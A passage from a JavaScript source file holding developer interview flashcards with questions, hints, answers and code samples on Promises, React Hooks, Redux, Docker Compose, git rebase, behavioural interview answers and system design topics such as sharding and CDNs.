// - Handles Database schema, raw data operations, queries.

// Controller (user.controller.js) 
// - Handles HTTP request/response logic. 
// - Calls the Model to get data, then passes data to the View.

// View / Route (user.routes.js) 
// - Defines the API endpoints (URLs).
// - In traditional MVC, View is HTML/UI templates sent to the client.`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p20-6",
          q: "What is a Promise?",
          hint: "Represents the eventual completion of an async operation.",
          answer: "An object representing the eventual completion (or failure) of an asynchronous operation. It has three states: pending, fulfilled, or rejected.",
          code: `const myPromise = new Promise((resolve, reject) => {
  // Simulate an async task like a network request
  setTimeout(() => {
    const success = true;
    
    if (success) resolve('Operation successful'); // Transitions to Fulfilled
    else reject('Operation failed');              // Transitions to Rejected
  }, 1000);
});

// Consuming the promise
myPromise
  .then(res => console.log(res))     // Runs on resolve
  .catch(err => console.error(err)); // Runs on reject`,
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p20-7",
          q: "What are React Hooks?",
          hint: "Functions starting with 'use'.",
          answer: "Functions that let you 'hook into' React state and lifecycle features from functional components. Common ones: useState, useEffect, useContext, useRef.",
          code: `import React, { useState, useEffect } from 'react';

function Counter() {
  // useState Hook: Adds local state to a function component
  const [count, setCount] = useState(0);

  // useEffect Hook: Handles side effects (like API calls or DOM updates)
  useEffect(() => {
    document.title = \`Count: \${count}\`;
  }, [count]); // Dependency array: only re-run if 'count' changes

  return (
    <button onClick={() => setCount(c => c+1)}>{count}</button>
  );
}`,
          category: "React",
          language: "javascript"
        },
        {
          id: "lf-p20-8",
          q: "What is Redux?",
          hint: "Global state management.",
          answer: "A predictable state container for JavaScript apps. It stores the entire application state in a single central store. Components dispatch 'actions' to 'reducers' to update the state.",
          code: `// Redux Core Concepts:
// 1. Store: The single source of truth that holds the global state.
// 2. Action: A plain object describing WHAT happened (e.g., { type: 'INCREMENT' }).
// 3. Reducer: A pure function that takes the current state + action, 
//    and returns a BRAND NEW state object.

const reducer = (state = 0, action) => {
  // If the action is INCREMENT, return a new state that is +1
  if (action.type === 'INCREMENT') return state + 1;
  
  // Otherwise, return the current state unchanged
  return state;
};`,
          category: "React Ecosystem",
          language: "javascript"
        },
        {
          id: "lf-p20-9",
          q: "What is Docker Compose?",
          hint: "Run multi-container applications.",
          answer: "A tool for defining and running multi-container Docker applications using a YAML file (docker-compose.yml). It allows starting all services (e.g., app + database) with a single command.",
          code: `# docker-compose.yml example for a Node app + PostgreSQL DB
version: '3'
services:
  web:
    build: .             # Build the Dockerfile in current dir
    ports: ["3000:3000"] # Map host port 3000 to container port 3000
    
  db:
    image: postgres      # Pull official Postgres image
    environment:
      POSTGRES_PASSWORD: secret

# Single command to spin up BOTH containers connected to the same network:
# docker-compose up`,
          category: "DevOps",
          language: "yaml"
        },
        {
          id: "lf-p20-10",
          q: "What is Git Rebase?",
          hint: "Moving a branch to a new base commit.",
          answer: "Rebasing takes the commits from one branch and applies them on top of another branch. It creates a cleaner, linear project history compared to git merge.",
          code: `# Standard Git Rebase workflow:

# 1. You are on your feature branch
git checkout feature-branch

# 2. Fetch latest changes from remote
git fetch origin

# 3. Rebase your branch ON TOP OF the latest main branch.
# This rewrites your commit history to make it look like you 
# just started working from the absolute latest main commit.
git rebase origin/main

# 4. Resolve any conflicts, then force push safely
git push --force-with-lease origin feature-branch`,
          category: "Tools",
          language: "bash"
        }
      ];
    case 21:
      return [
        {
          id: "lf-p21-1",
          q: "Behavioral: 'Tell me about yourself.'",
          hint: "Present, Past, Future framework.",
          answer: "Keep it professional. Start with your current role/status (Present), highlight key past experiences and achievements that led you here (Past), and explain why you're excited about this specific opportunity (Future).",
          code: `// Mental Outline for 'Tell me about yourself':
// 
// 1. Present: "I am currently a Software Engineer at X focusing on frontend..."
// 2. Past:    "Previously, I built backend APIs at Y which gave me full-stack perspective..."
// 3. Future:  "I'm looking to join your team because I love your product and want to scale..."`,
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-2",
          q: "Behavioral: 'Why do you want to work here?'",
          hint: "Show you did your research.",
          answer: "Mention specific details about the company's product, tech stack, culture, or recent news. Connect those details to your own skills and career goals.",
          code: `// Avoid generic answers like "It's a great company."
// 
// Good approach:
// 1. Mention a specific technical challenge they face that excites you.
// 2. Mention alignment with their core values or mission.
// 3. Highlight how your specific background helps solve their exact problems.`,
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-3",
          q: "Behavioral: 'Tell me about a time you had a conflict with a coworker.'",
          hint: "Focus on resolution and communication.",
          answer: "Use the STAR method (Situation, Task, Action, Result). Choose a professional disagreement (e.g., technical approach). Emphasize how you communicated, compromised, and achieved a positive outcome for the project.",
          code: `// STAR Method Example for Conflict:
// 
// S (Situation): "We disagreed on whether to use Redux or Context API."
// T (Task):      "We needed to decide quickly to meet the deadline."
// A (Action):    "I proposed a quick meeting, we listed pros/cons. I listened to their concerns about setup time, and agreed Context was better for this MVP."
// R (Result):    "We shipped on time and documented when to migrate to Redux later."`,
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-4",
          q: "Behavioral: 'What is your greatest weakness?'",
          hint: "Real weakness + Action plan.",
          answer: "State a genuine, professional weakness (not 'I work too hard'). Crucially, follow it up immediately with the actionable steps you are taking to improve it.",
          code: `// Example: Real Weakness + Actionable Growth
// 
// 1. The Weakness: "In the past, I struggled with delegating tasks because I wanted to ensure quality."
// 2. The Impact:   "However, I realized this creates bottlenecks for the team."
// 3. The Solution: "Now, I use a framework to break down tasks clearly and do code reviews instead of writing it all myself."`,
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-5",
          q: "Behavioral: 'Tell me about a project you are proud of.'",
          hint: "STAR method, emphasize YOUR contribution.",
          answer: "Use the STAR method. Clearly explain the technical challenges, the specific actions YOU took (avoid using 'we' too much), and the measurable results/impact of the project.",
          code: `// STAR Method Example for a Proud Project:
// 
// S (Situation): "App load time was 5 seconds."
// T (Task):      "Needed to optimize for better user retention."
// A (Action):    "I implemented code splitting, lazy loading, and optimized images." (Focus on "I", not "We")
// R (Result):    "Load time dropped to 1.2s, and bounce rate decreased by 20%."`,
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-6",
          q: "Questions for the interviewer: What should you ask?",
          hint: "Ask about team, culture, tech challenges.",
          answer: "Always ask questions! Ask about day-to-day responsibilities, the team's biggest technical challenge right now, engineering culture (code reviews, testing), or opportunities for growth.",
          code: `// Good questions to ask your interviewer:
// 
// - "What does a typical day look like for an engineer in this role?"
// - "What is the most challenging technical problem the team is facing right now?"
// - "How does the team handle code reviews, testing, and deployment?"
// - "How do you measure success in this role for the first 30/60/90 days?"`,
          category: "Behavioral",
          language: "javascript"
        },
        {
          id: "lf-p21-7",
          q: "System Design: How to approach a system design question?",
          hint: "Requirements -> Capacity -> High-level -> Deep dive.",
          answer: "1. Clarify Requirements (Functional & Non-Functional). 2. Back-of-envelope Estimation (Capacity). 3. High-level Design (Draw components). 4. Deep Dive (Database schema, APIs, scaling bottlenecks).",
          code: `// System Design Interview Flow:
// 
// 1. Clarify:   "Is this read-heavy or write-heavy? How many users?"
// 2. Estimate:  "10M DAU * 10 req/day = 1000 QPS."
// 3. High-level: Client -> Load Balancer -> App Servers -> Database (Master/Slave)
// 4. Deep Dive: "To handle the read load, I'd add a Redis cache layer here..."`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p21-8",
          q: "What is Horizontal vs Vertical Scaling?",
          hint: "More machines vs bigger machine.",
          answer: "Vertical scaling (Scaling Up) means adding more power (CPU, RAM) to an existing server. Horizontal scaling (Scaling Out) means adding more servers to a pool and using a load balancer.",
          code: `// Vertical Scaling (Scaling Up):
// Upgrade your single server from 2GB RAM to 16GB RAM. 
// (Easy, but has a hard hardware limit and single point of failure)

// Horizontal Scaling (Scaling Out):
// Go from 1 server to 10 servers behind a Load Balancer. 
// (Virtually infinite scale, fault-tolerant, but more complex to manage state)`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p21-9",
          q: "What is Database Sharding?",
          hint: "Splitting rows across multiple servers.",
          answer: "A type of database partitioning that separates very large databases into smaller, faster, more easily managed parts called data shards, which are distributed across multiple servers.",
          code: `// Example of a Database Sharding Strategy:
// 
// Hashing the User ID to determine which database server holds their data.
// - Server A: Holds users with IDs ending in 0-4
// - Server B: Holds users with IDs ending in 5-9
// 
// Pros: Allows massive scale by splitting data across multiple machines.
// Cons: Complex to implement, joining data across different shards is very slow.`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p21-10",
          q: "What is a Content Delivery Network (CDN)?",
          hint: "Geographically distributed edge servers.",
          answer: "A geographically distributed network of proxy servers and their data centers. The goal is to provide high availability and performance by distributing static assets (images, JS, CSS) spatially relative to end-users.",
          code: `// Requesting an image Without a CDN:
// User in Australia requests image from Server in New York -> 200ms latency (Slow)

// Requesting an image With a CDN:
// The image is cached in a CDN "edge server" located in Sydney.
// User in Australia requests image -> Served directly from Sydney -> 20ms latency (Fast!)`,
          category: "System Design",
          language: "javascript"
        }
      ];
    default:
      return [];
  }
}
